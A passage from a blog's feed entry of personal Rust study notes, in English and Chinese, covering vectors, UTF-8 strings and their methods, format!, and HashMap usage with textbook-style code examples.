class="line">    &#123;</span><br><span class="line">        let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        // do stuff with v</span><br><span class="line">    &#125; // &lt;- v goes out of scope and is freed here</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    let third: &amp;i32 = &amp;v[<span class="number">2</span>];</span><br><span class="line">    println!(<span class="string">&quot;The third element is &#123;&#125;&quot;</span>, third);</span><br><span class="line"></span><br><span class="line">    match v.get(<span class="number">2</span>) &#123; //gives us an Option&lt;&amp;<span class="built_in">T</span>&gt;.</span><br><span class="line">        Some(third) =&gt; println!(<span class="string">&quot;The third element is &#123;&#125;&quot;</span>, third),</span><br><span class="line">        None =&gt; println!(<span class="string">&quot;There is no third element.&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = vec![<span class="number">100</span>, <span class="number">32</span>, <span class="number">57</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;mut v &#123;</span><br><span class="line">        *i += <span class="number">50</span>; //解引用 dereference operator (*) to get to the value <span class="keyword">in</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum SpreadsheetCell &#123;</span><br><span class="line">        Int(i32),</span><br><span class="line">        Float(f64),</span><br><span class="line">        Text(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let row = vec![  //vec类型为SpreadsheetCell 实际上存储不同类型值</span><br><span class="line">        SpreadsheetCell::Int(<span class="number">3</span>),</span><br><span class="line">        SpreadsheetCell::Text(String::from(<span class="string">&quot;blue&quot;</span>)),</span><br><span class="line">        SpreadsheetCell::Float(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>枚举要配合match使用</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>Remember that<code>strings are UTF-8</code>encoded, </p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let hello = String::from(<span class="string">&quot;السلام عليكم&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Dobrý den&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;שָׁלוֹם&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;नमस्ते&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;こんにちは&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;안녕하세요&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Olá&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Здравствуйте&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Hola&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    s.push_str(<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    s.push(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>push method takes<code>a single character</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">&quot;world!&quot;</span>);</span><br><span class="line">    let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add <span class="built_in">call</span> and no longer be valid after that.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> add is that the compiler can coerce the &amp;String argument into a &amp;str</p><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;tic&quot;</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">&quot;tac&quot;</span>);</span><br><span class="line">    let s3 = String::from(<span class="string">&quot;toe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let s = format!(<span class="string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3); //doesn’t take ownership of <span class="built_in">any</span> of its parameters.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>utf-8 </code>可变字节 1-4字节，有些一个字节 有些4个字节</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">let hello = <span class="string">&quot;Здравствуйте&quot;</span>;</span><br><span class="line"></span><br><span class="line">let s = &amp;hello[<span class="number">0.</span>.4];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">c</span> <span class="keyword">in</span> <span class="string">&quot;नमस्ते&quot;</span>.chars() &#123;</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="built_in">c</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;नमस्ते&quot;</span>.bytes() &#123; // returns each raw byte,</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p><code>all of the keys</code> must have the<code> same type</code>, and all of the<code>values</code>must have the<code> same type.</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Yellow&quot;</span>), <span class="number">50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let teams = vec![String::from(<span class="string">&quot;Blue&quot;</span>), String::from(<span class="string">&quot;Yellow&quot;</span>)];</span><br><span class="line">    let initial_scores = vec![<span class="number">10</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    let mut scores: HashMap&lt;_, _&gt; =</span><br><span class="line">        teams.into_iter().zip(initial_scores.into_iter()).collect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>zip </code>method to create a vector of tuples<br><code>collect </code>method to turn that vector of tuples into a hash map,</p><p>For types that implement the <code>Copy trait</code>, like i32, the values<code> are copied into</code> the hash map. For owned values like String, the values will be moved and the hash map will be the <code>owner of those values</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line"></span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Yellow&quot;</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    let team_name = String::from(<span class="string">&quot;Blue&quot;</span>);</span><br><span class="line">    let score = scores.get(&amp;team_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;<br>no value get will return None.</p><pre><code>for (key, value) in &amp;scores &#123;    println!(&quot;&#123;&#125;: &#123;&#125;&quot;, key, value);&#125;</code></pre><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    scores.entry(String::from(<span class="string">&quot;Yellow&quot;</span>)).or_insert(<span class="number">50</span>);  //entry检查值是否存在，返回Entry， or_insert是Entry的方法 <span class="built_in">return</span> a mutable reference to the value   没有值插入</span><br><span class="line">    scores.entry(String::from(<span class="string">&quot;Blue&quot;</span>)).or_insert(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;&#123;:?&#125;&quot;</span>, scores); //&#123;<span class="string">&quot;Yellow&quot;</span>: <span class="number">50</span>, <span class="string">&quot;Blue&quot;</span>: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let text = <span class="string">&quot;hello world wonderful world&quot;</span>;</span><br><span class="line"></span><br><span class="line">    let mut map = HashMap::new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> text.split_whitespace() &#123;</span><br><span class="line">        let count = map.entry(word).or_insert(<span class="number">0</span>); //or_insert method actually returns a mutable reference (&amp;mut V) 所以可以加<span class="number">1</span></span><br><span class="line">        *count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;&#123;:?&#125;&quot;</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Debug&quot;&gt;&lt;a href=&quot;#Debug&quot; class=&quot;headerlink&quot; title=&quot;Debug&quot;&gt;&lt;/a&gt;Debug&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;Debug trait &lt;/code&gt;enables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.&lt;/p&gt;</summary>
    
    
    
    
    <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
</feed>
